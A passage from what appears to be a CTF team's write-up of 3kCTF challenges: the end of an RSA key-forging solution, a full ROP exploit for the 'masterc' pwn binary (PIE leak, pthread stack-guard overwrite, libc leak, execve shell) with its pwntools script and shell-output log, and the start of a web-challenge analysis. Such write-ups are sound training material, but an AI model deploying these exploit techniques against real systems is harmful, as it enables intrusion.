\begin{array}{ll}
d \bmod{\frac{r_2-1}{8}} \equiv 11 \\
d \bmod{\frac{r_3-1}{4}} \equiv 27 \\
d \bmod{8} \equiv 3
\end{array}
\right.
\]</span></p>

<p>By the Chinese Remainder Theorem, we have $d = 469849...444147$.</p>

<h3 id="part-iv-generating-the-private-key">Part IV: Generating the Private Key<a hidden class="anchor" aria-hidden="true" href="#part-iv-generating-the-private-key">#</a></h3>

<p>So we can generate the private key, by submitting the proof of work and the key to the challenge server to obtain the flag:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">n <span style="color:#f92672">=</span> p <span style="color:#f92672">*</span> q
e <span style="color:#f92672">=</span> pow(d, <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>, (p <span style="color:#f92672">-</span> <span style="color:#ae81ff">1</span>) <span style="color:#f92672">*</span> (q <span style="color:#f92672">-</span> <span style="color:#ae81ff">1</span>))
<span style="color:#f92672">from</span> Crypto.PublicKey <span style="color:#f92672">import</span> RSA
key <span style="color:#f92672">=</span> RSA<span style="color:#f92672">.</span>construct((n, e, d))
print(key<span style="color:#f92672">.</span>export_key()<span style="color:#f92672">.</span>decode())</code></pre></div>
<p>Sample Private Key:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-text" data-lang="text">-----BEGIN RSA PRIVATE KEY-----
MIIFJAIBAAKCAREUDyj+A0LeFPNuAY78kHjkqce86Hut6sL7GR4UG67f9yPyVi62
AHgbEXBRqPUVL2irfgqa/RoGqsSPnT8THeqgHpFbxErqDihyRjPgXEQYiMGG00rY
ZxGvESxd1V5WnwRi5qIYtodcYpH4W3mzRS13OkPwE9MghZpbDLv/MQuoga9hsWDx
6HnMqjn1QKJQCFMFJkf3jhl+B0U+qAiKFbNoFxw94n7S5iXHvktsNYfXfBlBWfYH
h3xvjbxCCEqcJCCJY58nihI88dVJizXWPAk6EdVFmz2A9Aepk/sQDx39IPv/gYCI
xH6HHnwNZGhasTk0SPMpelgpDj/EIVr67cHTt16MMGNse2nLNhJ4xCJ2nXUCggER
C2ZYKkUhLkMbl2cpuicTznJnfg1tJfW6OUg3SVQ/hF5iyxtIEC1dB0lQFEInzU94
OZ5UbFuXsFKH2LoUgW28c+lEi7ZEVgADYSK/vRXJ1gg2SJXpXq+fAgK2rup2jYUH
fs4uTTHEdHZsn68HmI2vSfbE+YnAPQgKV2wfKxHjTyac9CnKUBS4vgg7r7NFXwrF
UKxA/KW2JqItgGHQOO3f+CUzvncdjEt+DZtLzICYnjYCgpcdCppfPJnbjLgEoUMX
Ce/dFZBduXTyJTZYjivkAQPcqnrtb9001p4znE2qW2oYwkJnbMI3nYfUY8ZPgFR9
0skLeaZGnhJ9nioPMuJm58vnXhjTbxoHb3SZ6/+pYjJbAoIBEQRFxqXzpe/5sPhX
+8QJ1HFaynfmBMXlq07MtzOIwUimHVg+O2GuXGp1PmfJncsZnl2FDprTMtb8KF7s
2XZwQTqNb34gLL1Ux78HzL6hyjrMXUOuusNa/fyssajrBYG5vO7VpxFWstZOPNk+
ThMh3XYLTUPhuVyQ/ng5mh0tM1bV1fhAzuzOSU83Mm0rNHkJxU0BNry1wYaGEgTa
FpxETEG1rvt+KG+KPwvb/tMsznZqfFMUxnpRfCIHWZHSXjVqo73kmHnNCBn8reFs
7kWHA+k0ZAkfwCJpzNPsHthFFM795d0aFR8QjH0FJmSerAX1joJlVApGWSkQfhlJ
aLZCC/+cqWXftq9VkFcmMjwNu95d8wKBwwD+aqp1+dd5Fwl4cpmIN55IlSY868Lv
+YzuZCKcJjVzXZgkjOpegziBN+gWVVn0j5MMFn+hHYCN0j0ZKKAFVASxLBwIN+Wb
yppI5gaqj99utjptpoUnI0W4hHk6d3OpnT/8vcPhsSesupTB9DYtsH7oq1b9ynVm
z7GTI+GRwhfa5/YCqi57jlVKbo7M4Tvw2JN05HRNzVbjZefjy1PLK9esnYY0qcQY
bxywSF5kyOj9Pd8Ao/tCLbNZH3i7E8Et/iIajQJPFC8eR3E5VZniAqLKfNtngNS/
IfhKGDHGZxZ+psfLx9USKT2Lrnp/dM6VKPZIzNz1BcYRWj2GFVi35tW7npDcVnZS
rWBlpm/MJnNgH2oIiQIBGwIBCwKBwkzSg9YK9nvOxmDugCz+LNi82wRBhKiDpXGx
ZN2pamHx+lndJRWC9fslPEOCgkhngdN3kSUMRJrhP84df3I44XthJIYn33mXteFZ
noWHut0IHxERByKpmAH7cU4+YogwyV0PlhVvjJBq/zYHYhSJqRE5upl+TZxSg8aD
n7Mf5EHaUUjTxBO9xvkJntaDJAjKcZC7+s45wiJphO0I7uJ7s9cI9hqz4GBnZ7AH
bJ+WsYQzn+HtKK9H2mNaWklsHJ7OeYBl
-----END RSA PRIVATE KEY-----</code></pre></div>
<div class="alert warning">
  <p>For the completeness, here we explain why the pair using $r_1 - 1$ does not work:</p>
<p>Both the calculated $d$ ($213175&hellip;494107$) and $p-1$ ($r_1 - 1$) are divisible by $7$, so $d$ has no inverse under modulo $(p-1)(q-1)$, thus there are no $e$s. This explains the actual difficulty in finding a pair that passes all the coprime checks.</p>

</div>
  

<h2 id="masterc-pwn-478-points">masterc (Pwn; 478 points)<a hidden class="anchor" aria-hidden="true" href="#masterc-pwn-478-points">#</a></h2>

<p>Solved by <em>bot_3310</em>.</p>

<div class="alert success">
  <p><strong>TL;DR.</strong></p>
<ol>
<li>leak PIE base</li>
<li>overwrite stack guard</li>
<li>leak libc base</li>
<li>syscall</li>
</ol>

</div>
  

<p>First, we take a look at the binary.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-text" data-lang="text">──(bot3310㉿kali)-[~/Downloads/3kCTF/masterc/bin]
└─$ checksec masterc
[*] &#39;/home/bot3310/Downloads/3kCTF/masterc/bin/masterc&#39;
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled</code></pre></div>
<p>This binary has enabled all the protections. We are also given a C source code of the binary file. After analyzing the source code, we found <code>win</code> is vulnerable to ROP.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c"><span style="color:#66d9ef">void</span> <span style="color:#a6e22e">win</span>() {
        <span style="color:#66d9ef">char</span> buf[<span style="color:#ae81ff">0x10</span>];
        puts(<span style="color:#e6db74">&#34;&gt; &#34;</span>);
        gets(buf);
}</code></pre></div>
<p>Then, we found that we can leak PIE base in <code>play_game</code>.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c"><span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">long</span> <span style="color:#a6e22e">play_game</span>() {
        <span style="color:#66d9ef">static</span> <span style="color:#66d9ef">int</span> counter;
        <span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">long</span> r, guess;

        r <span style="color:#f92672">=</span> rand();

        printf(<span style="color:#e6db74">&#34;Enter your guess : &#34;</span>);
        get_ul(<span style="color:#f92672">&amp;</span>guess);

        <span style="color:#66d9ef">if</span>(r <span style="color:#f92672">==</span> guess) {
                printf(<span style="color:#e6db74">&#34;win!</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
                win();
        } 

        <span style="color:#66d9ef">if</span>(counter <span style="color:#f92672">==</span> max_tries<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>) {
                printf(<span style="color:#e6db74">&#34;Sorry, that was the last guess!</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
                printf(<span style="color:#e6db74">&#34;You entered %lu but the right number was %lu</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, guess, r);
                <span style="color:#66d9ef">return</span> r;
        }

        counter<span style="color:#f92672">++</span>;

        <span style="color:#66d9ef">return</span> r;
}</code></pre></div>
<p>The <code>guess</code> variable has not initialized at the beginning, it will be initialized by our input in <code>get_u1</code>. However <code>get_u1</code> uses <code>scanf(&quot;%lu&quot;, num)</code> to get our input.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c"><span style="color:#66d9ef">void</span> <span style="color:#a6e22e">get_ul</span>(<span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">long</span><span style="color:#f92672">*</span> num) {
        fflush(stdout);
        scanf(<span style="color:#e6db74">&#34;%lu&#34;</span>, num);
        readuntil(<span style="color:#e6db74">&#39;\n&#39;</span>);
}</code></pre></div>
<p><code>%lu</code> represents a unsigned long number, if we input a character, the <code>guess</code> will not be initialized successfully. If we input 1 as the guess number, the stack will be:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-text" data-lang="text">0x00007fffffffdd80│+0x0000: 0x00007fffffffdda0  →  0x00007fffffffdde0  →  0x0000555555555730  →  &lt;__libc_csu_init+0&gt; endbr64     ← $rsp
0x00007fffffffdd88│+0x0008: 0x0000000000000001
0x00007fffffffdd90│+0x0010: 0x000000004b4bb6e3
0x00007fffffffdd98│+0x0018: 0x5c724145e4937e00
0x00007fffffffdda0│+0x0020: 0x00007fffffffdde0  →  0x0000555555555730  →  &lt;__libc_csu_init+0&gt; endbr64    ← $rbp</code></pre></div>
<p>We can see our guess number is store in <code>rsp+0x8</code>. If we input <code>A</code> as the guess number, the stack will be:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-text" data-lang="text">0x00007fffffffdd80│+0x0000: 0x00007fffffffdda0  →  0x00007fffffffdde0  →  0x0000555555555730  →  &lt;__libc_csu_init+0&gt; endbr64     ← $rsp
0x00007fffffffdd88│+0x0008: 0x0000555555555579  →  &lt;set_number_of_tries+39&gt; mov DWORD PTR [rbp-0x4], eax
0x00007fffffffdd90│+0x0010: 0x0000000051831fd3
0x00007fffffffdd98│+0x0018: 0x44282bb265056400
0x00007fffffffdda0│+0x0020: 0x00007fffffffdde0  →  0x0000555555555730  →  &lt;__libc_csu_init+0&gt; endbr64    ← $rbp</code></pre></div>
<p>In <code>rsp+0x8</code>, there is the address of <code>&lt;set_number_of_tries+39&gt;</code> instead of the guess number because the <code>guess</code> variable has not initialized.</p>

<p>Also, in <code>play_game</code>, if there is the last try to guess, it will print out our guess number. Therefore, we can leak the address of <code>&lt;set_number_of_tries+39&gt;</code> when we input a character as our guess.</p>

<p>We can get the base address for PIE after subtracting the offset of <code>&lt;set_number_of_tries+39&gt;</code>.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">p<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">&#39;size :&#39;</span>, <span style="color:#e6db74">&#39;1&#39;</span>)
p<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">&#39;tries :&#39;</span>, <span style="color:#e6db74">&#39;1&#39;</span>)
p<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">&#39;guess&#39;</span>, <span style="color:#e6db74">&#39;A&#39;</span>)

<span style="color:#75715e"># leak pie_base</span>
p<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">&#39;entered&#39;</span>)
leak <span style="color:#f92672">=</span> str(p<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">&#39;but&#39;</span>))
leak <span style="color:#f92672">=</span> int(leak[<span style="color:#ae81ff">3</span>:<span style="color:#f92672">-</span><span style="color:#ae81ff">4</span>])
pie_base <span style="color:#f92672">=</span> leak <span style="color:#f92672">-</span> <span style="color:#ae81ff">0x1579</span>
print(<span style="color:#e6db74">&#34;pie_base:&#34;</span>, hex(pie_base))</code></pre></div>
<p>Although we failed to guess that random number, we can still get into <code>win</code> but with <code>pthread</code>:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c">printf(<span style="color:#e6db74">&#34;I don&#39;t think you won the game if you made it until here ...</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
printf(<span style="color:#e6db74">&#34;But maybe a threaded win can help?</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);

pthread_t tid;
pthread_create(<span style="color:#f92672">&amp;</span>tid, NULL, (<span style="color:#66d9ef">void</span><span style="color:#f92672">*</span>)win, NULL);
pthread_join(tid, NULL);</code></pre></div>
<p><code>pthread_t</code> will copy the <code>tcbhead_t</code> in stack for the new thread.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c"><span style="color:#66d9ef">typedef</span> <span style="color:#66d9ef">struct</span>
{
    <span style="color:#66d9ef">void</span> <span style="color:#f92672">*</span>tcb;        <span style="color:#75715e">/* Pointer to the TCB.  Not necessarily the
</span><span style="color:#75715e">                 thread descriptor used by libpthread.  */</span>
    dtv_t <span style="color:#f92672">*</span>dtv;
    <span style="color:#66d9ef">void</span> <span style="color:#f92672">*</span>self;       <span style="color:#75715e">/* Pointer to the thread descriptor.  */</span>
    <span style="color:#66d9ef">int</span> multiple_threads;
    <span style="color:#66d9ef">int</span> gscope_flag;
    uintptr_t sysinfo;
    uintptr_t stack_guard;
    uintptr_t pointer_guard;
    <span style="color:#75715e">// ...
</span><span style="color:#75715e"></span>} tcbhead_t;</code></pre></div>
<p>At the end of function, canary will be compared to the <code>stack_guard</code> to avoid stack smashing. Since <code>pthread</code> is placed the <code>tcbhed_t</code> in stack, we can overwrite the <code>stack_guard</code> to ensure the sucess of canary checking. If we overwite the <code>stack_guard</code> to <code>AAAAAAAA</code>, we can also use <code>AAAAAAAA</code> to overwrite the canary value.</p>

<p>Now, we can overflow unlimited buffer in <code>win</code>. We also have the PIE base address and avoid the canary check to fail. We can leak the libc base address with simple rop and return to <code>win</code> again.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#75715e"># leak libc_base</span>
win <span style="color:#f92672">=</span> pie_base <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x1436</span>
pop_rdi <span style="color:#f92672">=</span> pie_base <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x0000000000001793</span>
puts_got <span style="color:#f92672">=</span> pie_base <span style="color:#f92672">+</span> elf<span style="color:#f92672">.</span>got[<span style="color:#e6db74">&#39;puts&#39;</span>]
puts_plt <span style="color:#f92672">=</span> pie_base <span style="color:#f92672">+</span> elf<span style="color:#f92672">.</span>plt[<span style="color:#e6db74">&#39;puts&#39;</span>]

payload <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;A&#39;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">40</span> 
payload <span style="color:#f92672">+=</span> p64(pop_rdi)
payload <span style="color:#f92672">+=</span> p64(puts_got)
payload <span style="color:#f92672">+=</span> p64(puts_plt)
payload <span style="color:#f92672">+=</span> p64(win)
payload <span style="color:#f92672">+=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;A&#39;</span> <span style="color:#f92672">*</span> <span style="color:#ae81ff">3000</span> <span style="color:#75715e"># buffer big enough to overwrite the stack guard</span>
p<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">&#39;&gt;&#39;</span> , payload)

p<span style="color:#f92672">.</span>recv()
leak_put <span style="color:#f92672">=</span> p<span style="color:#f92672">.</span>recv(<span style="color:#ae81ff">6</span>)
libc_base <span style="color:#f92672">=</span> u64(leak_put<span style="color:#f92672">.</span>ljust(<span style="color:#ae81ff">8</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">&#39;</span>)) <span style="color:#f92672">-</span> libc<span style="color:#f92672">.</span>symbols[<span style="color:#e6db74">&#39;puts&#39;</span>]
print(<span style="color:#e6db74">&#39;libc_base:&#39;</span>, hex(libc_base))</code></pre></div>
<p>Finally, we use syscall to get the shell:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">binsh <span style="color:#f92672">=</span> libc_base <span style="color:#f92672">+</span> next(libc<span style="color:#f92672">.</span>search(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;/bin/sh&#34;</span>))

<span style="color:#75715e"># ret2libc syscall</span>
pop_rax <span style="color:#f92672">=</span> libc_base <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x000000000004a550</span>
pop_rdx <span style="color:#f92672">=</span> libc_base <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x0000000000162866</span>
pop_rsi <span style="color:#f92672">=</span> libc_base <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x0000000000027529</span>
syscall <span style="color:#f92672">=</span> libc_base <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x000000000002584d</span>

payload <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;A&#39;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">40</span>
payload <span style="color:#f92672">+=</span> p64(pop_rax)
payload <span style="color:#f92672">+=</span> p64(<span style="color:#ae81ff">0x3b</span>)
payload <span style="color:#f92672">+=</span> p64(pop_rdi)
payload <span style="color:#f92672">+=</span> p64(binsh)
payload <span style="color:#f92672">+=</span> p64(pop_rdx) <span style="color:#f92672">+</span> p64(<span style="color:#ae81ff">0</span>) <span style="color:#f92672">+</span> p64(<span style="color:#ae81ff">0</span>)
payload <span style="color:#f92672">+=</span> p64(pop_rsi) <span style="color:#f92672">+</span> p64(<span style="color:#ae81ff">0</span>)
payload <span style="color:#f92672">+=</span> p64(syscall)

p<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">&#39;&gt;&#39;</span>,payload)

p<span style="color:#f92672">.</span>interactive()</code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-text" data-lang="text">┌──(bot3310㉿kali)-[~/Downloads/3kCTF/masterc/bin]
└─$ python3 exp.py remote
[*] &#39;/home/bot3310/Downloads/3kCTF/masterc/bin/masterc&#39;
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
[+] Opening connection to masterc.2021.3k.ctf.to on port 9999: Done
[*] &#39;/home/bot3310/Downloads/3kCTF/masterc/bin/libc-2.31.so&#39;
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
pie_base: 0x559acce67000
libc_base: 0x7f51832bf000
[*] Switching to interactive mode
 
$ ls
bin
dev
flag.txt
ld-2.31.so
lib
lib32
lib64
libc-2.31.so
libx32
masterc
usr
$ cat flag.txt
3k{WH47_Pr3V3N7_Y0U_Fr0M_r0PP1N6_1F_Y0U_C4N_0V3rWr173_7H3_M4573r_C4N4rY_17531F}</code></pre></div>
<p>This is the final exploit:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>

TARGET <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;./masterc&#39;</span>
HOST <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;masterc.2021.3k.ctf.to&#39;</span>
PORT <span style="color:#f92672">=</span> <span style="color:#ae81ff">9999</span>
context<span style="color:#f92672">.</span>arch <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;amd64&#39;</span> <span style="color:#75715e"># i386 / amd64</span>
<span style="color:#75715e">#context.log_level = &#39;debug&#39;</span>
elf <span style="color:#f92672">=</span> ELF(TARGET)

<span style="color:#66d9ef">if</span> len(sys<span style="color:#f92672">.</span>argv) <span style="color:#f92672">&gt;</span> <span style="color:#ae81ff">1</span> <span style="color:#f92672">and</span> sys<span style="color:#f92672">.</span>argv[<span style="color:#ae81ff">1</span>] <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;remote&#39;</span>:
    p <span style="color:#f92672">=</span> remote(HOST, PORT)
    libc <span style="color:#f92672">=</span> ELF(<span style="color:#e6db74">&#39;./libc-2.31.so&#39;</span>)
<span style="color:#66d9ef">else</span>:
    p <span style="color:#f92672">=</span> process(TARGET)
    libc <span style="color:#f92672">=</span> elf<span style="color:#f92672">.</span>libc

<span style="color:#75715e">#---</span>
<span style="color:#75715e">#gdb.attach(p, gdbscript=&#39;b *win+56&#39;)</span>

p<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">&#39;size :&#39;</span>, <span style="color:#e6db74">&#39;1&#39;</span>)
p<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">&#39;tries :&#39;</span>, <span style="color:#e6db74">&#39;1&#39;</span>)
p<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">&#39;guess&#39;</span>, <span style="color:#e6db74">&#39;A&#39;</span>)

<span style="color:#75715e"># leak pie_base</span>
p<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">&#39;entered&#39;</span>)
leak <span style="color:#f92672">=</span> str(p<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">&#39;but&#39;</span>))
leak <span style="color:#f92672">=</span> int(leak[<span style="color:#ae81ff">3</span>:<span style="color:#f92672">-</span><span style="color:#ae81ff">4</span>])
pie_base <span style="color:#f92672">=</span> leak <span style="color:#f92672">-</span> <span style="color:#ae81ff">0x1579</span>
print(<span style="color:#e6db74">&#34;pie_base:&#34;</span>, hex(pie_base))

<span style="color:#75715e"># leak libc_base</span>
win <span style="color:#f92672">=</span> pie_base <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x1436</span>
pop_rdi <span style="color:#f92672">=</span> pie_base <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x0000000000001793</span>
puts_got <span style="color:#f92672">=</span> pie_base <span style="color:#f92672">+</span> elf<span style="color:#f92672">.</span>got[<span style="color:#e6db74">&#39;puts&#39;</span>]
puts_plt <span style="color:#f92672">=</span> pie_base <span style="color:#f92672">+</span> elf<span style="color:#f92672">.</span>plt[<span style="color:#e6db74">&#39;puts&#39;</span>]

payload <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;A&#39;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">40</span> 
payload <span style="color:#f92672">+=</span> p64(pop_rdi)
payload <span style="color:#f92672">+=</span> p64(puts_got)
payload <span style="color:#f92672">+=</span> p64(puts_plt)
payload <span style="color:#f92672">+=</span> p64(win)
payload <span style="color:#f92672">+=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;A&#39;</span> <span style="color:#f92672">*</span> <span style="color:#ae81ff">3000</span> <span style="color:#75715e"># buffer big enough to overwrite the stack guard</span>
p<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">&#39;&gt;&#39;</span> , payload)

p<span style="color:#f92672">.</span>recv()
leak_put <span style="color:#f92672">=</span> p<span style="color:#f92672">.</span>recv(<span style="color:#ae81ff">6</span>)
libc_base <span style="color:#f92672">=</span> u64(leak_put<span style="color:#f92672">.</span>ljust(<span style="color:#ae81ff">8</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">&#39;</span>)) <span style="color:#f92672">-</span> libc<span style="color:#f92672">.</span>symbols[<span style="color:#e6db74">&#39;puts&#39;</span>]
print(<span style="color:#e6db74">&#39;libc_base:&#39;</span>, hex(libc_base))

binsh <span style="color:#f92672">=</span> libc_base <span style="color:#f92672">+</span> next(libc<span style="color:#f92672">.</span>search(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;/bin/sh&#34;</span>))

<span style="color:#75715e"># ret2libc syscall</span>
pop_rax <span style="color:#f92672">=</span> libc_base <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x000000000004a550</span>
pop_rdx <span style="color:#f92672">=</span> libc_base <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x0000000000162866</span>
pop_rsi <span style="color:#f92672">=</span> libc_base <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x0000000000027529</span>
syscall <span style="color:#f92672">=</span> libc_base <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x000000000002584d</span>

payload <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;A&#39;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">40</span>
payload <span style="color:#f92672">+=</span> p64(pop_rax)
payload <span style="color:#f92672">+=</span> p64(<span style="color:#ae81ff">0x3b</span>)
payload <span style="color:#f92672">+=</span> p64(pop_rdi)
payload <span style="color:#f92672">+=</span> p64(binsh)
payload <span style="color:#f92672">+=</span> p64(pop_rdx) <span style="color:#f92672">+</span> p64(<span style="color:#ae81ff">0</span>) <span style="color:#f92672">+</span> p64(<span style="color:#ae81ff">0</span>)
payload <span style="color:#f92672">+=</span> p64(pop_rsi) <span style="color:#f92672">+</span> p64(<span style="color:#ae81ff">0</span>)
payload <span style="color:#f92672">+=</span> p64(syscall)

p<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">&#39;&gt;&#39;</span>,payload)

p<span style="color:#f92672">.</span>interactive()</code></pre></div>
<h2 id="ppaste-web-498-points">ppaste (Web; 498 points)<a hidden class="anchor" aria-hidden="true" href="#ppaste-web-498-points">#</a></h2>

<p>Solved by <em>ozetta</em>.</p>

<p>Well, you only get 498 points instead of 500 points if you are the only solver.</p>

<p>The first part of this challenge is to get an account (otherwise you can't create a note a play with the PDF stuff).</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php">$checkInvite <span style="color:#f92672">=</span> <span style="color:#f92672">@</span><span style="color:#a6e22e">json_decode</span>(<span style="color:#f92672">@</span><span style="color:#a6e22e">qInternal</span>(<span style="color:#e6db74">&#34;invites&#34;</span>,<span style="color:#a6e22e">json_encode</span>(<span style="color:#66d9ef">array</span>(<span style="color:#e6db74">&#34;invite&#34;</span><span style="color:#f92672">=&gt;</span>$data[<span style="color:#e6db74">&#39;d&#39;</span>][<span style="color:#e6db74">&#39;invite&#39;</span>]))),<span style="color:#66d9ef">true</span>);</code></pre></div>
<p>My first thought was having a 512 depth array as the invitation code to corrupt the <code>json_encode</code>. But the input got a length limitation. After a while, our teammate <em>apple</em> has registered an account successfully with an unknown payload. For some unknown reason I cannot reproduce his payload. But anyway we tried the second part of the challenge, which is to exploit the TCPDF to leak the flag. But it is not very successful because the space in the title field was removed and the content is sanitized.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php">$data[<span style="color:#e6db74">&#39;d&#39;</span>][<span style="color:#e6db74">&#39;title&#39;</span>] <span style="color:#f92672">=</span> <span style="color:#a6e22e">preg_replace</span>(<span style="color:#e6db74">&#34;/\s+/&#34;</span>, <span style="color:#e6db74">&#34;&#34;</span>, $data[<span style="color:#e6db74">&#39;d&#39;</span>][<span style="color:#e6db74">&#39;title&#39;</span>]);
<span style="color:#75715e">// ...
</span><span style="color:#75715e"></span>$html <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;&lt;h2&gt;&#39;</span><span style="color:#f92672">.</span>$tP[<span style="color:#e6db74">&#39;title&#39;</span>]<span style="color:#f92672">.</span><span style="color:#e6db74">&#39;&lt;/h2&gt;&lt;br&gt;&lt;h2&gt;&#39;</span><span style="color:#f92672">.</span><span style="color:#a6e22e">str_repeat</span>(<span style="color:#e6db74">&#34;-&#34;</span>, <span style="color:#ae81ff">40</span>)<span style="color:#f92672">.</span><span style="color:#e6db74">&#39;&lt;/h2&gt;&lt;pre&gt;&#39;</span><span style="color:#f92672">.</span><span style="color:#a6e22e">htmlentities</span>($tP[<span style="color:#e6db74">&#39;content&#39;</span>],<span style="color:#a6e22e">ENT_QUOTES</span>)<span style="color:#f92672">.</span><span style="color:#e6db74">&#39;&lt;/pre&gt;&#39;</span>;</code></pre></div>
<p><em>apple</em> also tried the special tag <code>&lt;tcpdf&gt;</code>, which could be used for code execution<sup class="footnote-ref" id="fnref:tcpdf"><a class="footnote" href="#fn:tcpdf">10</a></sup>, but unfortunately it is not enabled by default.</p>

<p>Let's review the first part. We managed to find some other payload that corrupts the JSON input in Python. Then I found that a sufficiently large number like <code>3e333</code> will result in <code>INF</code> in PHP, which is invalid in Python. But it could not be used to bypass the invitation code and <em>apple</em> found that it is because <code>INF</code>'s string length is 3, which is less than 4 and fails in a checking condition.</p>
